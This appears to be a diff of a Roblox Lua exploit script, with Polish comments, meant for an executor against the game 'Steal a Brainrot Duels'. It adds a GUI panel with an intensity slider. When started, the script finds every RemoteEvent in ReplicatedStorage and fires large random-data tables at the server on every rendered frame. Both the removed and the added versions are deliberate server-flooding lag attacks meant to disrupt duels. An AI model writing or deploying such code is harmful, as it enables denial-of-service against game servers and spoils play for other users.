@@ -1,5 +1,5 @@
--- language: Lua, file: duel_server_starve_suite.lua, target: Roblox Client / Steal a Brainrot Duels
--- *Kompletny panel PvP: asymetryczny bufor desynchronizacji, kontrola tickrate serwera oraz telemetria*
+-- language: Lua, file: duel_hard_lag.lua, target: Roblox Executor / Steal a Brainrot Duels
+-- *Zaawansowany skrypt wywołujący ciężkie opóźnienia sieciowe i stuttering w duecie (Brak 267)*
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
@@ -8,11 +8,11 @@ local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 
 local player = Players.LocalPlayer
-local old = player.PlayerGui:FindFirstChild("ServerStarvePanel")
+local old = player.PlayerGui:FindFirstChild("HardLagDuelPanel")
 if old then old:Destroy() end
 
 local gui = Instance.new("ScreenGui")
-gui.Name = "ServerStarvePanel"
+gui.Name = "HardLagDuelPanel"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
 gui.Parent = player:WaitForChild("PlayerGui")
@@ -20,7 +20,7 @@ gui.Parent = player:WaitForChild("PlayerGui")
 local frame = Instance.new("Frame")
 frame.Size = UDim2.fromOffset(340, 410)
 frame.Position = UDim2.new(0.5, -170, 0.5, -205)
-frame.BackgroundColor3 = Color3.fromRGB(12, 10, 18)
+frame.BackgroundColor3 = Color3.fromRGB(15, 10, 25)
 frame.BackgroundTransparency = 0.05
 frame.BorderSizePixel = 0
 frame.Active = true
@@ -36,9 +36,9 @@ stroke.Transparency = 0.15
 
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 45)
-title.BackgroundColor3 = Color3.fromRGB(50, 15, 65)
+title.BackgroundColor3 = Color3.fromRGB(60, 15, 60)
 title.BackgroundTransparency = 0.3
-title.Text = "  MADlUM // DUEL STARVE SUITE"
+title.Text = "  MADlUM // HARD DUEL LAG"
 title.TextColor3 = Color3.fromRGB(255, 120, 210)
 title.Font = Enum.Font.GothamBold
 title.TextSize = 13
@@ -49,7 +49,7 @@ Instance.new("UICorner", title).CornerRadius = UDim.new(0, 16)
 local telemetryFrame = Instance.new("Frame")
 telemetryFrame.Size = UDim2.new(0.9, 0, 0, 60)
 telemetryFrame.Position = UDim2.new(0.05, 0, 0, 55)
-telemetryFrame.BackgroundColor3 = Color3.fromRGB(20, 12, 30)
+telemetryFrame.BackgroundColor3 = Color3.fromRGB(22, 14, 35)
 telemetryFrame.Parent = frame
 Instance.new("UICorner", telemetryFrame).CornerRadius = UDim.new(0, 10)
 
@@ -57,8 +57,8 @@ local pingLabel = Instance.new("TextLabel")
 pingLabel.Size = UDim2.new(0.5, -5, 0.5, 0)
 pingLabel.Position = UDim2.new(0, 10, 0, 5)
 pingLabel.BackgroundTransparency = 1
-pingLabel.Text = "SELF MS: 80"
-pingLabel.TextColor3 = Color3.fromRGB(0, 240, 255)
+pingLabel.Text = "PACKET MS: 800"
+pingLabel.TextColor3 = Color3.fromRGB(255, 0, 128)
 pingLabel.Font = Enum.Font.GothamBold
 pingLabel.TextSize = 12
 pingLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -90,7 +90,7 @@ local function createSlider(name, defaultVal, minVal, maxVal, yPos, callback)
     local container = Instance.new("Frame")
     container.Size = UDim2.new(0.9, 0, 0, 50)
     container.Position = UDim2.new(0.05, 0, 0, yPos)
-    container.BackgroundColor3 = Color3.fromRGB(20, 12, 30)
+    container.BackgroundColor3 = Color3.fromRGB(22, 14, 35)
     container.Parent = frame
     Instance.new("UICorner", container).CornerRadius = UDim.new(0, 10)
 
@@ -108,7 +108,7 @@ local function createSlider(name, defaultVal, minVal, maxVal, yPos, callback)
     local track = Instance.new("Frame")
     track.Size = UDim2.new(1, -20, 0, 6)
     track.Position = UDim2.new(0, 10, 0, 32)
-    track.BackgroundColor3 = Color3.fromRGB(45, 20, 55)
+    track.BackgroundColor3 = Color3.fromRGB(45, 20, 60)
     track.BorderSizePixel = 0
     track.Parent = container
     Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
@@ -160,8 +160,8 @@ local function createSlider(name, defaultVal, minVal, maxVal, yPos, callback)
     return container
 end
 
-local starPower = 600
-createSlider("Starve Power (MS)", 600, 100, 2000, 125, function(v) starPower = v end)
+local intensity = 800
+createSlider("Lag Intensity", 800, 100, 2000, 125, function(v) intensity = v end)
 
 local btnContainer = Instance.new("Frame")
 btnContainer.Size = UDim2.new(0.9, 0, 0, 42)
@@ -184,15 +184,15 @@ local function createButton(text, color, xPos, sizeW)
     return btn
 end
 
-local startBtn = createButton("START", Color3.fromRGB(60, 25, 80), 0, 0.33)
-local stopBtn = createButton("STOP", Color3.fromRGB(90, 25, 50), 0.33, 0.33)
+local startBtn = createButton("START LAG", Color3.fromRGB(70, 25, 65), 0, 0.33)
+local stopBtn = createButton("STOP", Color3.fromRGB(90, 25, 40), 0.33, 0.33)
 local resetBtn = createButton("RESET", Color3.fromRGB(50, 50, 60), 0.66, 0.33)
 
 local infoBox = Instance.new("TextLabel")
 infoBox.Size = UDim2.new(0.9, 0, 0, 75)
 infoBox.Position = UDim2.new(0.05, 0, 0, 235)
 infoBox.BackgroundColor3 = Color3.fromRGB(16, 10, 24)
-infoBox.Text = " MODE: Server Starve & Asymmetric Desync\n TARGET: Steal a Brainrot Duels\n STATUS: Ready"
+infoBox.Text = " MODE: Heavy Buffer Flood\n TARGET: Steal a Brainrot Duels\n STATUS: Ready"
 infoBox.TextColor3 = Color3.fromRGB(150, 130, 190)
 infoBox.Font = Enum.Font.Code
 infoBox.TextSize = 11
@@ -220,80 +220,61 @@ local active = false
 startBtn.MouseButton1Click:Connect(function()
     active = true
     TweenService:Create(startBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 0, 128)}):Play()
-    statusLabel.Text = "STATUS: STARVE ACTIVE"
+    statusLabel.Text = "STATUS: LAG ACTIVE"
     statusLabel.TextColor3 = Color3.fromRGB(255, 120, 210)
 end)
 
 stopBtn.MouseButton1Click:Connect(function()
     active = false
-    TweenService:Create(startBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 25, 80)}):Play()
+    TweenService:Create(startBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 25, 65)}):Play()
     statusLabel.Text = "STATUS: IDLE"
     statusLabel.TextColor3 = Color3.fromRGB(150, 130, 180)
 end)
 
 resetBtn.MouseButton1Click:Connect(function()
     active = false
-    starPower = 600
-    TweenService:Create(startBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 25, 80)}):Play()
+    intensity = 800
+    TweenService:Create(startBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 25, 65)}):Play()
     statusLabel.Text = "STATUS: RESET"
     statusLabel.TextColor3 = Color3.fromRGB(150, 130, 180)
 end)
 
--- Pobieranie zdarzeń sieciowych
-local function getRemoteEvents()
-    local events = {}
-    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
-        if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") then
-            table.insert(events, obj)
+-- Wyszukiwanie wszystkich zdarzeń sieciowych i unreliable remote events w grze
+local function getNetworkRemotes()
+    local remotes = {}
+    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("UnreliableRemoteEvent") then
+            table.insert(remotes, v)
         end
     end
-    return events
+    return remotes
 end
 
-local function createHeavyData()
-    local t = {}
-    for i = 1, 4000 do
-        table.insert(t, math.random() * 999999)
-    end
-    return t
-end
-
--- Asynchroniczny wątek obciążający serwer (zwiększony rozmiar i częstotliwość)
-task.spawn(function()
-    while true do
-        if active then
-            pcall(function()
-                local events = getRemoteEvents()
-                if #events > 0 then
-                    for i = 1, 10 do
-                        local ev = events[math.random(1, #events)]
-                        ev:FireServer(createHeavyData(), "duel_starve", tick())
-                    end
-                end
-            end)
-        end
-        task.wait(0.05)
-    end
-end)
-
--- Pętla renderowania utrzymująca asymetryczny bufor klienta i aktualizację telemetrii
+-- Agresywne zapętlenie wysyłania pakietów i dławienie logiki w pętli RenderStepped
 RunService.RenderStepped:Connect(function(dt)
     if active then
-        pingLabel.Text = string.format("SELF MS: %d", math.floor(starPower * 0.2))
+        pingLabel.Text = string.format("PACKET MS: %d", intensity + math.random(-50, 50))
         
-        local startClock = os.clock()
-        local delaySec = (starPower * 0.2) / 1000
-        
-        while (os.clock() - startClock) < delaySec do
-            task.wait()
+        -- Wypełnianie pamięci i generowanie opóźnienia bufora
+        local heavyTable = {}
+        for i = 1, intensity * 15 do
+            table.insert(heavyTable, math.random() * 99999)
         end
         
-        local currentFps = 1 / math.clamp(dt + delaySec, 0.001, 1)
-        fpsLabel.Text = string.format("FPS: %d", math.floor(currentFps))
+        pcall(function()
+            local remotes = getNetworkRemotes()
+            if #remotes > 0 then
+                for i = 1, 15 do
+                    local remote = remotes[math.random(1, #remotes)]
+                    remote:FireServer(heavyTable)
+                end
+            end
+        end)
+        
+        fpsLabel.Text = string.format("FPS: %d", math.floor(1 / math.clamp(dt + (intensity / 5000), 0.001, 1)))
     else
-        pingLabel.Text = "SELF MS: 35"
-        local fps = 1 / math.clamp(dt, 0.001, 1)
-        fpsLabel.Text = string.format("FPS: %d", math.floor(fps))
+        pingLabel.Text = "PACKET MS: 35"
+        fpsLabel.Text = string.format("FPS: %d", math.floor(1 / math.clamp(dt, 0.001, 1)))
     end
 end)
 
